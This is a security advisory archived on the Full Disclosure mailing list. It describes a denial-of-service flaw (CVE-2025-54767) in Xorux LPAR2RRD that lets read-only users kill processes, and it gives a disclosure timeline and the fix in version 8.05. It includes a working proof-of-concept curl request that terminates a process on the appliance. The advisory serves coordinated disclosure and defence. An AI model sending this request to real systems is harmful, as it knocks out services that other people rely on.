---
title: KL-001-2025-014: Xorux LPAR2RRD Read Only User Denial of	Service
url: https://seclists.org/fulldisclosure/2025/Jul/17
source: Full Disclosure
date: 2025-07-29
fetch_date: 2025-10-07T00:09:45.962618
---

# KL-001-2025-014: Xorux LPAR2RRD Read Only User Denial of	Service

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)

[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![fulldisclosure logo](/images/fulldisclosure-logo.png)](/fulldisclosure/)

## [Full Disclosure](/fulldisclosure/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](16)
[By Date](date.html#17)
[![Next](/images/right-icon-16x16.png)](18)

[![Previous](/images/left-icon-16x16.png)](16)
[By Thread](index.html#17)
[![Next](/images/right-icon-16x16.png)](18)

![](/shared/images/nst-icons.svg#search)

# KL-001-2025-014: Xorux LPAR2RRD Read Only User Denial of Service

---

*From*: KoreLogic Disclosures via Fulldisclosure <fulldisclosure () seclists org>
*Date*: Mon, 28 Jul 2025 18:40:28 -0500

---

```
KL-001-2025-014: Xorux LPAR2RRD Read Only User Denial of Service

Title: Xorux LPAR2RRD Read Only User Denial of Service
Advisory ID: KL-001-2025-014
Publication Date: 2025-07-28
Publication URL: https://korelogic.com/Resources/Advisories/KL-001-2025-014.txt

1. Vulnerability Details

     Affected Vendor: Xorux
     Affected Product: LPAR2RRD
     Affected Version: 8.04 and prior
     Platform: Rocky Linux 8.10
     CWE Classification: CWE-648: Incorrect Use of Privileged APIs
     CVE ID: CVE-2025-54767

2. Vulnerability Description

     An authenticated, read-only user can kill any processes running
     on the Xormon Original virtual appliance as the lpar2rrd user.

3. Technical Description

     The web application endpoint of
     https://<ip>/lpar2rrd-cgi/reporter.sh calls
     ../bin/reporter_cfg.pl, which contains a URL parameter command
     called "stop" which allows an attacker to specify a process ID
     (PID) to stop. The web application, running as the lpar2rrd
     user, then kills the process on the virtual appliance. This
     could be used to stop the webserver, the xormon.war web
     application or the lpar2rrd-daemon process, creating a denial
     of service (DoS) condition.

4. Mitigation and Remediation Recommendation

     Xorux released version 8.05, which includes a remediation
     for this vulnerability. See https://lpar2rrd.com/note800.php.

5. Credit

     This vulnerability was discovered by Jim Becher of KoreLogic,
     Inc.

6. Disclosure Timeline

     2025-07-17 : KoreLogic requests point-of-contact to securely
                  report several vulnerabilities to Xorux.
     2025-07-18 : Vendor provides support () xorux com as the
                  point-of-contact, noting that they do not use PGP.
     2025-07-21 : KoreLogic submits this vulnerability and four
                  additional discoveries to Xorux.
     2025-07-23 : Vendor acknowledges receipt, stating that the issue
                  has been remediated and a new version of the
                  affected product will be available 2025-07-25.
     2025-07-25 : Xorux publishes updated version of the affected
                  product.
     2025-07-28 : KoreLogic public disclosure.

7. Proof of Concept

     On the Xormon Original virtual appliance:

         [lpar2rrd@xorux ~]$ ps -efww | grep lpar2rrd | grep bash
         lpar2rrd  185824  185823  0 May27 pts/0    00:00:00 -bash
         lpar2rrd 1777882  185824  0 13:40 pts/0    00:00:00 grep --color=auto bash
         [lpar2rrd@xorux ~]$

     From attacker box:
```

         attacker $ curl -k -H "Authorization: Basic amJlY2hlcjpqYmVjaGVy"
'[https://172.31.255.207/lpar2rrd-cgi/reporter.sh?cmd=stop&pid=185824'](https://172.31.255.207/lpar2rrd-cgi/reporter.sh?cmd=stop&pid=185824&apos);

```
         {"status":"terminated"}

     On the Xormon Original virtual appliance:

         [lpar2rrd@xorux ~]$ Connection to 172.31.255.207 closed.
         attacker $

The contents of this advisory are copyright(c) 2025
KoreLogic, Inc. and are licensed under a Creative Commons
Attribution Share-Alike 4.0 (United States) License:
http://creativecommons.org/licenses/by-sa/4.0/

KoreLogic, Inc. is a founder-owned and operated company with a
proven track record of providing security services to entities
ranging from Fortune 500 to small and mid-sized companies. We
are a highly skilled team of senior security consultants doing
by-hand security assessments for the most important networks in
the U.S. and around the world. We are also developers of various
tools and resources aimed at helping the security community.
https://www.korelogic.com/about-korelogic.html

Our public vulnerability disclosure policy is available at:
https://korelogic.com/KoreLogic-Public-Vulnerability-Disclosure-Policy
```

**Attachment:
[OpenPGP\_signature.asc](att-17/OpenPGP_signature_asc.bin)**
*Description:* OpenPGP digital signature

```
_______________________________________________
Sent through the Full Disclosure mailing list
https://nmap.org/mailman/listinfo/fulldisclosure
Web Archives & RSS: https://seclists.org/fulldisclosure/
```

---

[![Previous](/images/left-icon-16x16.png)](16)
[By Date](date.html#17)
[![Next](/images/right-icon-16x16.png)](18)

[![Previous](/images/left-icon-16x16.png)](16)
[By Thread](index.html#17)
[![Next](/images/right-icon-16x16.png)](18)

### Current thread:

* **KL-001-2025-014: Xorux LPAR2RRD Read Only User Denial of Service** *KoreLogic Disclosures via Fulldisclosure (Jul 28)*

![](/shared/images/nst-icons.svg#search)

## [Nmap Security Scanner](https://nmap.org/)

* [Ref Guide](https://nmap.org/book/man.html)* [Install Guide](https://nmap.org/book/install.html)* [Docs](https://nmap.org/docs.html)* [Download](https://nmap.org/download.html)* [Nmap OEM](https://nmap.org/oem/)

## [Npcap packet capture](https://npcap.com/)

* [User's Guide](https://npcap.com/guide/)* [API docs](https://npcap.com/guide/npcap-devguide.html#npcap-api)* [Download](https://npcap.com/#download)* [Npcap OEM](https://npcap.com/oem/)

## [Security Lists](https://seclists.org/)

* [Nmap Announce](https://seclists.org/nmap-announce/)* [Nmap Dev](https://seclists.org/nmap-dev/)* [Full Disclosure](https://seclists.org/fulldisclosure/)* [Open Source Security](https://seclists.org/oss-sec/)* [BreachExchange](https://seclists.org/dataloss/)

## [Security Tools](https://sectools.org)

* [Vuln scanners](https://sectools.org/tag/vuln-scanners/)* [Password audit](https://sectools.org/tag/pass-audit/)* [Web scanners](https://sectools.org/tag/web-scanners/)* [Wireless](https://sectools.org/tag/wireless/)* [Exploitation](https://sectools.org/tag/sploits/)

## [About](https://insecure.org/)

* [About/Contact](https://insecure.org/fyodor/)* [Privacy](https://insecure.org/privacy.html)* [Advertising](https://insecure.org/advertising.html)* [Nmap Public Source License](https://nmap.org/npsl/)

[![](/shared/images/nst-icons.svg#twitter)](https://twitter.com/nmap "Visit us on Twitter")
[![](/shared/images/nst-icons.svg#facebook)](https://facebook.com/nmap "Visit us on Facebook")
[![](/shared/images/nst-icons.svg#github)](https://github.com/nmap/ "Visit us on Github")
[![](/shared/images/nst-icons.svg#reddit)](https://reddit.com/r/nmap/ "Discuss Nmap on Reddit")